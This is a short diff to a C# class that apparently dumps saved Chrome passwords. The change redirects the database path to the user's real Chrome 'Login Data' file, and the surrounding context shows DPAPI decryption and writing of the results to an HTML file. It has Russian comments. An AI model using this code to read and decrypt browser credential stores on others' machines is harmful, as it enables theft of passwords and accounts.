@@ -337,7 +337,9 @@ public class Chrome
         {
             string filename = "my_chrome_passwords.html"; 
             StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
-            string db_way = "Login Data"; //путь к файлу базы данных
+            string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+				+ "/Google/Chrome/User Data/Default/Login Data"; //путь к файлу базы данных
+			Console.WriteLine("DB file = " + db_way);
             string db_field = "logins";   //имя поля БД
             byte[] entropy = null; //разработчики не стали использовать энтропию.
                                    //Однако класс DPAPI требует указания энтропии в любом случае,
